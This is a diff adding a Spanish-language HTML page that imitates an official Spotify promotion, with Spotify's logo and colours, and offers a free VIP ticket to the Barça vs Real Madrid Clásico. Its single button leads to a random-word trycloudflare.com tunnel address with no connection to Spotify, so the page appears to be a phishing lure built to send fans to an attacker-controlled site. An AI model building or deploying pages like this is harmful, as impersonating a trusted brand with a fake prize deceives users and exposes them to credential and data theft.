@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify Promo - El Clásico</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        /* RESET DE ESTILOS */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #000000;
+            font-family: 'Montserrat', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #FFFFFF;
+            overflow: hidden;
+        }
+
+        /* CONTENEDOR PRINCIPAL (LA TARJETA) */
+        .promo-card {
+            background: linear-gradient(180deg, #222222 0%, #121212 100%);
+            width: 90%;
+            max-width: 450px;
+            padding: 40px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .promo-card:hover {
+            transform: translateY(-5px);
+        }
+
+        /* LOGO DE SPOTIFY */
+        .spotify-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .spotify-logo {
+            width: 45px;
+            height: 45px;
+        }
+
+        .spotify-header span {
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+
+        /* CONTENIDO DE TEXTO */
+        .badge {
+            display: inline-block;
+            background-color: #1DB954;
+            color: #000;
+            font-size: 10px;
+            font-weight: 800;
+            padding: 4px 12px;
+            border-radius: 4px;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            letter-spacing: 1px;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 800;
+            line-height: 1.1;
+            margin-bottom: 20px;
+        }
+
+        h1 span {
+            color: #1DB954;
+        }
+
+        p {
+            color: #b3b3b3;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 40px;
+        }
+
+        /* BOTÓN DE ENLACE ESTILO SPOTIFY */
+        .btn-action {
+            display: inline-block; /* Importante para que acepte paddings */
+            background-color: #1DB954;
+            color: #000000;
+            text-decoration: none; /* Quita el subrayado del enlace */
+            padding: 18px 45px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 500px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            transition: all 0.2s ease-in-out;
+            border: none;
+            cursor: pointer;
+        }
+
+        .btn-action:hover {
+            background-color: #1ed760;
+            transform: scale(1.06);
+            color: #000000;
+        }
+
+        .btn-action:active {
+            transform: scale(0.98);
+            background-color: #1aa34a;
+        }
+
+        /* DETALLES DE FONDO */
+        .bg-glow {
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            background: radial-gradient(circle, rgba(29, 185, 84, 0.15) 0%, rgba(0, 0, 0, 0) 70%);
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-glow"></div>
+
+    <div class="promo-card">
+        <div class="spotify-header">
+            <svg class="spotify-logo" viewBox="0 0 167.5 167.5">
+                <path fill="#1DB954" d="M83.7 0C37.5 0 0 37.5 0 83.7c0 46.3 37.5 83.7 83.7 83.7 46.3 0 83.7-37.5 83.7-83.7S130 0 83.7 0zM122.1 120.8c-1.4 2.3-4.3 3-6.6 1.6-18.5-11.3-41.8-13.9-69.2-7.6-2.7.7-5.3-1.1-5.9-3.7-.7-2.6 1.1-5.3 3.7-5.9 30-6.8 55.8-3.9 76.4 8.7 2.3 1.4 3 4.3 1.6 6.9zm10.4-22.8c-1.7 2.8-5.3 3.7-8.1 2-21.1-13-53.3-16.8-78.3-9.2-3.1 1-6.5-.8-7.5-3.9-1-3.1.8-6.5 3.9-7.5 28.5-8.6 64.1-4.4 88 10.3 2.8 1.8 3.7 5.4 2 8.3zm1.1-23.9C108.7 57.7 67.3 56.3 43.4 63.6c-3.9 1.2-8-1-9.2-4.9-1.2-3.9 1-8 4.9-9.2 27.5-8.3 73.3-6.7 101.4 10 3.5 2.1 4.7 6.7 2.6 10.2-2 3.5-6.7 4.7-10.2 2.6z"/>
+            </svg>
+            <span>Spotify</span>
+        </div>
+
+        <div class="badge">Especial Fans</div>
+        
+        <h1>¡Gana gratis una entrada para el <span>Barça vs Real Madrid</span>!</h1>
+        
+        <p>Tu música te lleva al estadio. Participa hoy mismo por un pase VIP para vivir El Clásico en vivo.</p>
+        
+        <!-- Cambia "tu-archivo.html" por la ruta de tu destino -->
+        <a href="https://acquire-beautifully-iowa-drinking.trycloudflare.com" class="btn-action">Oprime aquí</a>
+    </div>
+
+</body>
+</html>
